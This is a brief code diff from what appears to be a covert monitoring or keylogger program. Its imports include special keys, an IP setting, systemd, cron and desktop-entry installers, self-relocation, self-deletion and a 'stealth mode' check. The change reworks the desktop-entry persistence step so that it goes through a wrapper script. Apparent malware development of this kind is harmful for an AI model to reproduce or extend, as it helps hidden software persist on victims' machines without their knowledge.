@@ -17,7 +17,7 @@ from config import special_keys, IP, BACKUP_DIR_DEFAULT
 from backup import get_file_name, _md5_of_file, self_backup_and_delete
 from setup_systemd import install_systemd_service, create_unit_content
 from setup_cron import create_bash_content, install_cron_job
-from setup_desktop_entry import create_helper, install_desktop_entry
+from setup_desktop_entry import install_desktop_entry, create_wrapper_script
 from handshake_and_move import safe_self_relocate, is_running_in_temp_dir, run_copy_process, is_stealth_mode
 
 
@@ -179,7 +179,11 @@ def main():
 
     # 1.c. Create desktop entry as a backup if requested
     if do_desktop:
-        if not install_desktop_entry(progFileName=filename, progFileBackup=filename_md5):
+        wrapper_path = create_wrapper_script(progFileName=filename, progFileBackup=filename_md5)
+        if wrapper_path is None:
+            print("Error creating wrapper script.")
+            return
+        if not install_desktop_entry(wrapper_path=wrapper_path):
             print("Error creating desktop entry.")
             return
     else:
